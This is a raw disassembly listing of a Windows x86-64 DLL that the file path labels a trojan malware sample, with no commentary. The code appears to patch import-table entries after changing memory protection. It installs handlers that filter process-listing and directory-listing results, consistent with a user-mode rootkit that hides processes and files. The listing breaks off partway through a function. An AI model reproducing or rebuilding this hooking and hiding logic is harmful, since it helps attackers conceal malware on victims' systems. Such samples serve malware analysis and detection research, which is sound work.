
malware_samples/trojan/344deaa1c873df34d0d9eba1ad015b8edc840763dd03a45e86e6f5f6c6d6b175.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001005:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000100a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000100f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180001014:	41 54                	push   %r12
   180001016:	41 56                	push   %r14
   180001018:	41 57                	push   %r15
   18000101a:	48 83 ec 60          	sub    $0x60,%rsp
   18000101e:	48 8b 05 db 3f 00 00 	mov    0x3fdb(%rip),%rax        # 0x180005000
   180001025:	48 33 c4             	xor    %rsp,%rax
   180001028:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   18000102d:	48 8d 0d 3c 22 00 00 	lea    0x223c(%rip),%rcx        # 0x180003270
   180001034:	4d 8b f8             	mov    %r8,%r15
   180001037:	ff 15 eb 1f 00 00    	call   *0x1feb(%rip)        # 0x180003028
   18000103d:	48 8b e8             	mov    %rax,%rbp
   180001040:	48 85 c0             	test   %rax,%rax
   180001043:	0f 84 ec 00 00 00    	je     0x180001135
   180001049:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   18000104d:	8b b4 01 90 00 00 00 	mov    0x90(%rcx,%rax,1),%esi
   180001054:	48 03 f0             	add    %rax,%rsi
   180001057:	83 3e 00             	cmpl   $0x0,(%rsi)
   18000105a:	0f 84 d5 00 00 00    	je     0x180001135
   180001060:	45 33 e4             	xor    %r12d,%r12d
   180001063:	8b 4e 0c             	mov    0xc(%rsi),%ecx
   180001066:	48 8d 15 f3 21 00 00 	lea    0x21f3(%rip),%rdx        # 0x180003260
   18000106d:	48 03 cd             	add    %rbp,%rcx
   180001070:	ff 15 f2 20 00 00    	call   *0x20f2(%rip)        # 0x180003168
   180001076:	85 c0                	test   %eax,%eax
   180001078:	0f 85 aa 00 00 00    	jne    0x180001128
   18000107e:	8b 3e                	mov    (%rsi),%edi
   180001080:	8b 5e 10             	mov    0x10(%rsi),%ebx
   180001083:	48 03 fd             	add    %rbp,%rdi
   180001086:	48 03 dd             	add    %rbp,%rbx
   180001089:	48 8b 07             	mov    (%rdi),%rax
   18000108c:	48 85 c0             	test   %rax,%rax
   18000108f:	0f 84 93 00 00 00    	je     0x180001128
   180001095:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000109c:	00 00 00 00 
   1800010a0:	48 8d 55 02          	lea    0x2(%rbp),%rdx
   1800010a4:	48 03 d0             	add    %rax,%rdx
   1800010a7:	48 8d 0d da 21 00 00 	lea    0x21da(%rip),%rcx        # 0x180003288
   1800010ae:	e8 69 14 00 00       	call   0x18000251c
   1800010b3:	85 c0                	test   %eax,%eax
   1800010b5:	75 5c                	jne    0x180001113
   1800010b7:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   1800010bd:	44 89 64 24 50       	mov    %r12d,0x50(%rsp)
   1800010c2:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1800010c7:	48 8b cb             	mov    %rbx,%rcx
   1800010ca:	ff 15 78 1f 00 00    	call   *0x1f78(%rip)        # 0x180003048
   1800010d0:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   1800010d5:	4c 8d 4c 24 44       	lea    0x44(%rsp),%r9
   1800010da:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1800010df:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1800010e5:	ff 15 25 1f 00 00    	call   *0x1f25(%rip)        # 0x180003010
   1800010eb:	85 c0                	test   %eax,%eax
   1800010ed:	74 46                	je     0x180001135
   1800010ef:	4c 8b 33             	mov    (%rbx),%r14
   1800010f2:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   1800010f7:	44 8b 44 24 44       	mov    0x44(%rsp),%r8d
   1800010fc:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   180001101:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   180001106:	4c 89 3b             	mov    %r15,(%rbx)
   180001109:	ff 15 01 1f 00 00    	call   *0x1f01(%rip)        # 0x180003010
   18000110f:	85 c0                	test   %eax,%eax
   180001111:	75 50                	jne    0x180001163
   180001113:	48 8b 47 08          	mov    0x8(%rdi),%rax
   180001117:	48 83 c7 08          	add    $0x8,%rdi
   18000111b:	48 83 c3 08          	add    $0x8,%rbx
   18000111f:	48 85 c0             	test   %rax,%rax
   180001122:	0f 85 78 ff ff ff    	jne    0x1800010a0
   180001128:	48 83 c6 14          	add    $0x14,%rsi
   18000112c:	44 39 26             	cmp    %r12d,(%rsi)
   18000112f:	0f 85 2e ff ff ff    	jne    0x180001063
   180001135:	33 c0                	xor    %eax,%eax
   180001137:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   18000113c:	48 33 cc             	xor    %rsp,%rcx
   18000113f:	e8 7c 05 00 00       	call   0x1800016c0
   180001144:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   180001149:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   18000114d:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   180001151:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180001155:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   180001159:	49 8b e3             	mov    %r11,%rsp
   18000115c:	41 5f                	pop    %r15
   18000115e:	41 5e                	pop    %r14
   180001160:	41 5c                	pop    %r12
   180001162:	c3                   	ret
   180001163:	49 8b c6             	mov    %r14,%rax
   180001166:	eb cf                	jmp    0x180001137
   180001168:	cc                   	int3
   180001169:	cc                   	int3
   18000116a:	cc                   	int3
   18000116b:	cc                   	int3
   18000116c:	cc                   	int3
   18000116d:	cc                   	int3
   18000116e:	cc                   	int3
   18000116f:	cc                   	int3
   180001170:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001175:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000117a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000117f:	55                   	push   %rbp
   180001180:	41 54                	push   %r12
   180001182:	41 55                	push   %r13
   180001184:	41 56                	push   %r14
   180001186:	41 57                	push   %r15
   180001188:	48 8d ac 24 20 fa ff 	lea    -0x5e0(%rsp),%rbp
   18000118f:	ff 
   180001190:	48 81 ec e0 06 00 00 	sub    $0x6e0,%rsp
   180001197:	48 8b 05 62 3e 00 00 	mov    0x3e62(%rip),%rax        # 0x180005000
   18000119e:	48 33 c4             	xor    %rsp,%rax
   1800011a1:	48 89 85 d0 05 00 00 	mov    %rax,0x5d0(%rbp)
   1800011a8:	4d 8b e0             	mov    %r8,%r12
   1800011ab:	ff 15 67 1e 00 00    	call   *0x1e67(%rip)        # 0x180003018
   1800011b1:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800011b7:	48 8d 95 c0 04 00 00 	lea    0x4c0(%rbp),%rdx
   1800011be:	48 8b c8             	mov    %rax,%rcx
   1800011c1:	ff 15 59 1e 00 00    	call   *0x1e59(%rip)        # 0x180003020
   1800011c7:	33 d2                	xor    %edx,%edx
   1800011c9:	48 8d 4c 24 64       	lea    0x64(%rsp),%rcx
   1800011ce:	41 b8 34 04 00 00    	mov    $0x434,%r8d
   1800011d4:	e8 83 12 00 00       	call   0x18000245c
   1800011d9:	33 d2                	xor    %edx,%edx
   1800011db:	c7 44 24 60 38 04 00 	movl   $0x438,0x60(%rsp)
   1800011e2:	00 
   1800011e3:	b9 08 00 00 00       	mov    $0x8,%ecx
   1800011e8:	ff 15 42 1e 00 00    	call   *0x1e42(%rip)        # 0x180003030
   1800011ee:	48 8b d8             	mov    %rax,%rbx
   1800011f1:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800011f5:	0f 84 c9 00 00 00    	je     0x1800012c4
   1800011fb:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180001200:	48 8b c8             	mov    %rax,%rcx
   180001203:	ff 15 2f 1e 00 00    	call   *0x1e2f(%rip)        # 0x180003038
   180001209:	85 c0                	test   %eax,%eax
   18000120b:	0f 84 b3 00 00 00    	je     0x1800012c4
   180001211:	4c 8d 4d 90          	lea    -0x70(%rbp),%r9
   180001215:	48 c7 44 24 20 04 01 	movq   $0x104,0x20(%rsp)
   18000121c:	00 00 
   18000121e:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180001224:	48 8d 95 b0 03 00 00 	lea    0x3b0(%rbp),%rdx
   18000122b:	33 c9                	xor    %ecx,%ecx
   18000122d:	ff 15 d5 1e 00 00    	call   *0x1ed5(%rip)        # 0x180003108
   180001233:	48 8d 95 b0 03 00 00 	lea    0x3b0(%rbp),%rdx
   18000123a:	c6 85 b3 04 00 00 00 	movb   $0x0,0x4b3(%rbp)
   180001241:	48 8d 8d c0 04 00 00 	lea    0x4c0(%rbp),%rcx
   180001248:	ff 15 82 1e 00 00    	call   *0x1e82(%rip)        # 0x1800030d0
   18000124e:	48 85 c0             	test   %rax,%rax
   180001251:	0f 85 9f 00 00 00    	jne    0x1800012f6
   180001257:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   18000125c:	48 8b cb             	mov    %rbx,%rcx
   18000125f:	ff 15 db 1d 00 00    	call   *0x1ddb(%rip)        # 0x180003040
   180001265:	85 c0                	test   %eax,%eax
   180001267:	74 5b                	je     0x1800012c4
   180001269:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001270:	4c 8d 4d 90          	lea    -0x70(%rbp),%r9
   180001274:	48 c7 44 24 20 04 01 	movq   $0x104,0x20(%rsp)
   18000127b:	00 00 
   18000127d:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180001283:	48 8d 95 b0 03 00 00 	lea    0x3b0(%rbp),%rdx
   18000128a:	33 c9                	xor    %ecx,%ecx
   18000128c:	ff 15 76 1e 00 00    	call   *0x1e76(%rip)        # 0x180003108
   180001292:	48 8d 95 b0 03 00 00 	lea    0x3b0(%rbp),%rdx
   180001299:	c6 85 b3 04 00 00 00 	movb   $0x0,0x4b3(%rbp)
   1800012a0:	48 8d 8d c0 04 00 00 	lea    0x4c0(%rbp),%rcx
   1800012a7:	ff 15 23 1e 00 00    	call   *0x1e23(%rip)        # 0x1800030d0
   1800012ad:	48 85 c0             	test   %rax,%rax
   1800012b0:	75 44                	jne    0x1800012f6
   1800012b2:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1800012b7:	48 8b cb             	mov    %rbx,%rcx
   1800012ba:	ff 15 80 1d 00 00    	call   *0x1d80(%rip)        # 0x180003040
   1800012c0:	85 c0                	test   %eax,%eax
   1800012c2:	75 ac                	jne    0x180001270
   1800012c4:	33 c0                	xor    %eax,%eax
   1800012c6:	48 8b 8d d0 05 00 00 	mov    0x5d0(%rbp),%rcx
   1800012cd:	48 33 cc             	xor    %rsp,%rcx
   1800012d0:	e8 eb 03 00 00       	call   0x1800016c0
   1800012d5:	4c 8d 9c 24 e0 06 00 	lea    0x6e0(%rsp),%r11
   1800012dc:	00 
   1800012dd:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1800012e1:	49 8b 73 38          	mov    0x38(%r11),%rsi
   1800012e5:	49 8b 7b 40          	mov    0x40(%r11),%rdi
   1800012e9:	49 8b e3             	mov    %r11,%rsp
   1800012ec:	41 5f                	pop    %r15
   1800012ee:	41 5e                	pop    %r14
   1800012f0:	41 5d                	pop    %r13
   1800012f2:	41 5c                	pop    %r12
   1800012f4:	5d                   	pop    %rbp
   1800012f5:	c3                   	ret
   1800012f6:	48 8b 75 88          	mov    -0x78(%rbp),%rsi
   1800012fa:	48 85 f6             	test   %rsi,%rsi
   1800012fd:	74 c5                	je     0x1800012c4
   1800012ff:	48 63 46 3c          	movslq 0x3c(%rsi),%rax
   180001303:	44 8b b4 30 90 00 00 	mov    0x90(%rax,%rsi,1),%r14d
   18000130a:	00 
   18000130b:	4c 03 f6             	add    %rsi,%r14
   18000130e:	41 83 3e 00          	cmpl   $0x0,(%r14)
   180001312:	74 b0                	je     0x1800012c4
   180001314:	45 33 ed             	xor    %r13d,%r13d
   180001317:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000131e:	00 00 
   180001320:	41 8b 4e 0c          	mov    0xc(%r14),%ecx
   180001324:	48 8d 15 35 1f 00 00 	lea    0x1f35(%rip),%rdx        # 0x180003260
   18000132b:	48 03 ce             	add    %rsi,%rcx
   18000132e:	ff 15 34 1e 00 00    	call   *0x1e34(%rip)        # 0x180003168
   180001334:	85 c0                	test   %eax,%eax
   180001336:	0f 85 b4 00 00 00    	jne    0x1800013f0
   18000133c:	41 8b 3e             	mov    (%r14),%edi
   18000133f:	41 8b 5e 10          	mov    0x10(%r14),%ebx
   180001343:	48 03 fe             	add    %rsi,%rdi
   180001346:	48 03 de             	add    %rsi,%rbx
   180001349:	48 8b 07             	mov    (%rdi),%rax
   18000134c:	48 85 c0             	test   %rax,%rax
   18000134f:	0f 84 9b 00 00 00    	je     0x1800013f0
   180001355:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000135c:	00 00 00 00 
   180001360:	48 8d 50 02          	lea    0x2(%rax),%rdx
   180001364:	48 03 d6             	add    %rsi,%rdx
   180001367:	48 8d 0d d2 1e 00 00 	lea    0x1ed2(%rip),%rcx        # 0x180003240
   18000136e:	e8 a9 11 00 00       	call   0x18000251c
   180001373:	85 c0                	test   %eax,%eax
   180001375:	75 64                	jne    0x1800013db
   180001377:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   18000137d:	44 89 ad a0 03 00 00 	mov    %r13d,0x3a0(%rbp)
   180001384:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   180001389:	48 8b cb             	mov    %rbx,%rcx
   18000138c:	ff 15 b6 1c 00 00    	call   *0x1cb6(%rip)        # 0x180003048
   180001392:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   180001397:	4c 8d 4c 24 54       	lea    0x54(%rsp),%r9
   18000139c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1800013a1:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1800013a7:	ff 15 63 1c 00 00    	call   *0x1c63(%rip)        # 0x180003010
   1800013ad:	85 c0                	test   %eax,%eax
   1800013af:	0f 84 0f ff ff ff    	je     0x1800012c4
   1800013b5:	4c 8b 3b             	mov    (%rbx),%r15
   1800013b8:	4c 8d 8d a0 03 00 00 	lea    0x3a0(%rbp),%r9
   1800013bf:	44 8b 44 24 54       	mov    0x54(%rsp),%r8d
   1800013c4:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1800013c9:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1800013ce:	4c 89 23             	mov    %r12,(%rbx)
   1800013d1:	ff 15 39 1c 00 00    	call   *0x1c39(%rip)        # 0x180003010
   1800013d7:	85 c0                	test   %eax,%eax
   1800013d9:	75 27                	jne    0x180001402
   1800013db:	48 8b 47 08          	mov    0x8(%rdi),%rax
   1800013df:	48 83 c7 08          	add    $0x8,%rdi
   1800013e3:	48 83 c3 08          	add    $0x8,%rbx
   1800013e7:	48 85 c0             	test   %rax,%rax
   1800013ea:	0f 85 70 ff ff ff    	jne    0x180001360
   1800013f0:	49 83 c6 14          	add    $0x14,%r14
   1800013f4:	45 39 2e             	cmp    %r13d,(%r14)
   1800013f7:	0f 85 23 ff ff ff    	jne    0x180001320
   1800013fd:	e9 c2 fe ff ff       	jmp    0x1800012c4
   180001402:	49 8b c7             	mov    %r15,%rax
   180001405:	e9 bc fe ff ff       	jmp    0x1800012c6
   18000140a:	cc                   	int3
   18000140b:	cc                   	int3
   18000140c:	cc                   	int3
   18000140d:	cc                   	int3
   18000140e:	cc                   	int3
   18000140f:	cc                   	int3
   180001410:	48 83 ec 38          	sub    $0x38,%rsp
   180001414:	85 d2                	test   %edx,%edx
   180001416:	74 3b                	je     0x180001453
   180001418:	83 fa 01             	cmp    $0x1,%edx
   18000141b:	74 07                	je     0x180001424
   18000141d:	33 c0                	xor    %eax,%eax
   18000141f:	48 83 c4 38          	add    $0x38,%rsp
   180001423:	c3                   	ret
   180001424:	ff 15 26 1c 00 00    	call   *0x1c26(%rip)        # 0x180003050
   18000142a:	33 c0                	xor    %eax,%eax
   18000142c:	4c 8d 05 0d 02 00 00 	lea    0x20d(%rip),%r8        # 0x180001640
   180001433:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180001438:	45 33 c9             	xor    %r9d,%r9d
   18000143b:	33 d2                	xor    %edx,%edx
   18000143d:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180001441:	33 c9                	xor    %ecx,%ecx
   180001443:	ff 15 0f 1c 00 00    	call   *0x1c0f(%rip)        # 0x180003058
   180001449:	b8 01 00 00 00       	mov    $0x1,%eax
   18000144e:	48 83 c4 38          	add    $0x38,%rsp
   180001452:	c3                   	ret
   180001453:	e8 28 02 00 00       	call   0x180001680
   180001458:	cc                   	int3
   180001459:	cc                   	int3
   18000145a:	cc                   	int3
   18000145b:	cc                   	int3
   18000145c:	cc                   	int3
   18000145d:	cc                   	int3
   18000145e:	cc                   	int3
   18000145f:	cc                   	int3
   180001460:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180001465:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   18000146a:	57                   	push   %rdi
   18000146b:	48 83 ec 30          	sub    $0x30,%rsp
   18000146f:	48 8b da             	mov    %rdx,%rbx
   180001472:	8b f9                	mov    %ecx,%edi
   180001474:	ff 15 06 42 00 00    	call   *0x4206(%rip)        # 0x180005680
   18000147a:	8b e8                	mov    %eax,%ebp
   18000147c:	83 ff 05             	cmp    $0x5,%edi
   18000147f:	75 7f                	jne    0x180001500
   180001481:	85 c0                	test   %eax,%eax
   180001483:	75 7b                	jne    0x180001500
   180001485:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   18000148a:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   18000148f:	45 33 f6             	xor    %r14d,%r14d
   180001492:	8b 03                	mov    (%rbx),%eax
   180001494:	48 8d 15 f5 41 00 00 	lea    0x41f5(%rip),%rdx        # 0x180005690
   18000149b:	48 8b fb             	mov    %rbx,%rdi
   18000149e:	48 c7 44 24 20 04 01 	movq   $0x104,0x20(%rsp)
   1800014a5:	00 00 
   1800014a7:	48 8b f3             	mov    %rbx,%rsi
   1800014aa:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800014b0:	48 03 d8             	add    %rax,%rbx
   1800014b3:	33 c9                	xor    %ecx,%ecx
   1800014b5:	4c 8b 4b 40          	mov    0x40(%rbx),%r9
   1800014b9:	ff 15 49 1c 00 00    	call   *0x1c49(%rip)        # 0x180003108
   1800014bf:	48 8d 15 5a 1d 00 00 	lea    0x1d5a(%rip),%rdx        # 0x180003220
   1800014c6:	44 88 35 c6 42 00 00 	mov    %r14b,0x42c6(%rip)        # 0x180005793
   1800014cd:	48 8d 0d bc 41 00 00 	lea    0x41bc(%rip),%rcx        # 0x180005690
   1800014d4:	ff 15 f6 1b 00 00    	call   *0x1bf6(%rip)        # 0x1800030d0
   1800014da:	48 85 c0             	test   %rax,%rax
   1800014dd:	74 10                	je     0x1800014ef
   1800014df:	8b 03                	mov    (%rbx),%eax
   1800014e1:	85 c0                	test   %eax,%eax
   1800014e3:	75 05                	jne    0x1800014ea
   1800014e5:	44 89 36             	mov    %r14d,(%rsi)
   1800014e8:	eb 02                	jmp    0x1800014ec
   1800014ea:	01 07                	add    %eax,(%rdi)
   1800014ec:	48 8b de             	mov    %rsi,%rbx
   1800014ef:	44 39 36             	cmp    %r14d,(%rsi)
   1800014f2:	75 9e                	jne    0x180001492
   1800014f4:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   1800014f9:	8b c5                	mov    %ebp,%eax
   1800014fb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180001500:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180001505:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   18000150a:	48 83 c4 30          	add    $0x30,%rsp
   18000150e:	5f                   	pop    %rdi
   18000150f:	c3                   	ret
   180001510:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180001515:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   18000151a:	57                   	push   %rdi
   18000151b:	48 83 ec 60          	sub    $0x60,%rsp
   18000151f:	0f b6 84 24 c0 00 00 	movzbl 0xc0(%rsp),%eax
   180001526:	00 
   180001527:	8b bc 24 a8 00 00 00 	mov    0xa8(%rsp),%edi
   18000152e:	48 8b 9c 24 98 00 00 	mov    0x98(%rsp),%rbx
   180001535:	00 
   180001536:	88 44 24 50          	mov    %al,0x50(%rsp)
   18000153a:	48 8b 84 24 b8 00 00 	mov    0xb8(%rsp),%rax
   180001541:	00 
   180001542:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180001547:	0f b6 84 24 b0 00 00 	movzbl 0xb0(%rsp),%eax
   18000154e:	00 
   18000154f:	88 44 24 40          	mov    %al,0x40(%rsp)
   180001553:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   18000155a:	89 7c 24 38          	mov    %edi,0x38(%rsp)
   18000155e:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180001562:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   180001569:	00 
   18000156a:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   18000156f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001574:	ff 15 0e 41 00 00    	call   *0x410e(%rip)        # 0x180005688
   18000157a:	8b e8                	mov    %eax,%ebp
   18000157c:	83 ff 25             	cmp    $0x25,%edi
   18000157f:	0f 85 a2 00 00 00    	jne    0x180001627
   180001585:	85 c0                	test   %eax,%eax
   180001587:	0f 85 9a 00 00 00    	jne    0x180001627
   18000158d:	48 89 74 24 70       	mov    %rsi,0x70(%rsp)
   180001592:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   180001597:	45 33 f6             	xor    %r14d,%r14d
   18000159a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1800015a0:	8b 03                	mov    (%rbx),%eax
   1800015a2:	48 8d 15 f7 41 00 00 	lea    0x41f7(%rip),%rdx        # 0x1800057a0
   1800015a9:	48 8b fb             	mov    %rbx,%rdi
   1800015ac:	48 c7 44 24 20 04 01 	movq   $0x104,0x20(%rsp)
   1800015b3:	00 00 
   1800015b5:	48 8b f3             	mov    %rbx,%rsi
   1800015b8:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800015be:	48 03 d8             	add    %rax,%rbx
   1800015c1:	33 c9                	xor    %ecx,%ecx
   1800015c3:	4c 8d 4b 68          	lea    0x68(%rbx),%r9
   1800015c7:	ff 15 3b 1b 00 00    	call   *0x1b3b(%rip)        # 0x180003108
   1800015cd:	48 8d 15 4c 1c 00 00 	lea    0x1c4c(%rip),%rdx        # 0x180003220
   1800015d4:	44 88 35 c8 42 00 00 	mov    %r14b,0x42c8(%rip)        # 0x1800058a3
   1800015db:	48 8d 0d be 41 00 00 	lea    0x41be(%rip),%rcx        # 0x1800057a0
   1800015e2:	ff 15 e8 1a 00 00    	call   *0x1ae8(%rip)        # 0x1800030d0
   1800015e8:	48 85 c0             	test   %rax,%rax
   1800015eb:	75 19                	jne    0x180001606
   1800015ed:	48 8d 15 3c 1c 00 00 	lea    0x1c3c(%rip),%rdx        # 0x180003230
   1800015f4:	48 8d 0d a5 41 00 00 	lea    0x41a5(%rip),%rcx        # 0x1800057a0
   1800015fb:	ff 15 cf 1a 00 00    	call   *0x1acf(%rip)        # 0x1800030d0
   180001601:	48 85 c0             	test   %rax,%rax
   180001604:	74 10                	je     0x180001616
   180001606:	8b 03                	mov    (%rbx),%eax
   180001608:	85 c0                	test   %eax,%eax
   18000160a:	75 05                	jne    0x180001611
   18000160c:	44 89 37             	mov    %r14d,(%rdi)
   18000160f:	eb 02                	jmp    0x180001613
   180001611:	01 07                	add    %eax,(%rdi)
   180001613:	48 8b de             	mov    %rsi,%rbx
   180001616:	44 39 36             	cmp    %r14d,(%rsi)
   180001619:	75 85                	jne    0x1800015a0
   18000161b:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
   180001620:	8b c5                	mov    %ebp,%eax
   180001622:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   180001627:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   18000162c:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   180001630:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   180001634:	49 8b e3             	mov    %r11,%rsp
   180001637:	5f                   	pop    %rdi
   180001638:	c3                   	ret
   180001639:	cc                   	int3
   18000163a:	cc                   	int3
   18000163b:	cc                   	int3
   18000163c:	cc                   	int3
   18000163d:	cc                   	int3
   18000163e:	cc                   	int3
   18000163f:	cc                   	int3
   180001640:	48 83 ec 28          	sub    $0x28,%rsp
   180001644:	4c 8d 05 15 fe ff ff 	lea    -0x1eb(%rip),%r8        # 0x180001460
   18000164b:	e8 20 fb ff ff       	call   0x180001170
   180001650:	4c 8d 05 b9 fe ff ff 	lea    -0x147(%rip),%r8        # 0x180001510
   180001657:	48 89 05 22 40 00 00 	mov    %rax,0x4022(%rip)        # 0x180005680
   18000165e:	e8 9d f9 ff ff       	call   0x180001000
   180001663:	33 c9                	xor    %ecx,%ecx
   180001665:	48 89 05 1c 40 00 00 	mov    %rax,0x401c(%rip)        # 0x180005688
   18000166c:	ff 15 f6 19 00 00    	call   *0x19f6(%rip)        # 0x180003068
   180001672:	cc                   	int3
   180001673:	cc                   	int3
   180001674:	cc                   	int3
   180001675:	cc                   	int3
   180001676:	cc                   	int3
   180001677:	cc                   	int3
   180001678:	cc                   	int3
   180001679:	cc                   	int3
   18000167a:	cc                   	int3
   18000167b:	cc                   	int3
   18000167c:	cc                   	int3
   18000167d:	cc                   	int3
   18000167e:	cc                   	int3
   18000167f:	cc                   	int3
   180001680:	40 53                	rex push %rbx
   180001682:	48 83 ec 20          	sub    $0x20,%rsp
   180001686:	4c 8b 05 f3 3f 00 00 	mov    0x3ff3(%rip),%r8        # 0x180005680
   18000168d:	48 8b d9             	mov    %rcx,%rbx
   180001690:	e8 db fa ff ff       	call   0x180001170
   180001695:	4c 8b 05 ec 3f 00 00 	mov    0x3fec(%rip),%r8        # 0x180005688
   18000169c:	e8 5f f9 ff ff       	call   0x180001000
   1800016a1:	33 d2                	xor    %edx,%edx
   1800016a3:	48 8b cb             	mov    %rbx,%rcx
   1800016a6:	ff 15 b4 19 00 00    	call   *0x19b4(%rip)        # 0x180003060
   1800016ac:	cc                   	int3
   1800016ad:	cc                   	int3
   1800016ae:	cc                   	int3
   1800016af:	cc                   	int3
   1800016b0:	cc                   	int3
   1800016b1:	cc                   	int3
   1800016b2:	cc                   	int3
   1800016b3:	cc                   	int3
   1800016b4:	cc                   	int3
   1800016b5:	cc                   	int3
   1800016b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800016bd:	00 00 00 
   1800016c0:	48 3b 0d 39 39 00 00 	cmp    0x3939(%rip),%rcx        # 0x180005000
   1800016c7:	75 10                	jne    0x1800016d9
   1800016c9:	48 c1 c1 10          	rol    $0x10,%rcx
   1800016cd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   1800016d2:	75 01                	jne    0x1800016d5
   1800016d4:	c3                   	ret
   1800016d5:	48 c1 c9 10          	ror    $0x10,%rcx
   1800016d9:	e9 36 00 00 00       	jmp    0x180001714
   1800016de:	cc                   	int3
   1800016df:	cc                   	int3
   1800016e0:	40 53                	rex push %rbx
   1800016e2:	48 83 ec 20          	sub    $0x20,%rsp
   1800016e6:	48 8b d9             	mov    %rcx,%rbx
   1800016e9:	33 c9                	xor    %ecx,%ecx
   1800016eb:	ff 15 97 19 00 00    	call   *0x1997(%rip)        # 0x180003088
   1800016f1:	48 8b cb             	mov    %rbx,%rcx
   1800016f4:	ff 15 86 19 00 00    	call   *0x1986(%rip)        # 0x180003080
   1800016fa:	ff 15 18 19 00 00    	call   *0x1918(%rip)        # 0x180003018
   180001700:	48 8b c8             	mov    %rax,%rcx
   180001703:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   180001708:	48 83 c4 20          	add    $0x20,%rsp
   18000170c:	5b                   	pop    %rbx
   18000170d:	48 ff 25 84 19 00 00 	rex.W jmp *0x1984(%rip)        # 0x180003098
   180001714:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180001719:	48 83 ec 38          	sub    $0x38,%rsp
   18000171d:	b9 17 00 00 00       	mov    $0x17,%ecx
   180001722:	ff 15 68 19 00 00    	call   *0x1968(%rip)        # 0x180003090
   180001728:	85 c0                	test   %eax,%eax
   18000172a:	74 07                	je     0x180001733
   18000172c:	b9 02 00 00 00       	mov    $0x2,%ecx
   180001731:	cd 29                	int    $0x29
   180001733:	48 8d 0d e6 39 00 00 	lea    0x39e6(%rip),%rcx        # 0x180005120
   18000173a:	e8 a9 00 00 00       	call   0x1800017e8
   18000173f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180001744:	48 89 05 cd 3a 00 00 	mov    %rax,0x3acd(%rip)        # 0x180005218
   18000174b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   180001750:	48 83 c0 08          	add    $0x8,%rax
   180001754:	48 89 05 5d 3a 00 00 	mov    %rax,0x3a5d(%rip)        # 0x1800051b8
   18000175b:	48 8b 05 b6 3a 00 00 	mov    0x3ab6(%rip),%rax        # 0x180005218
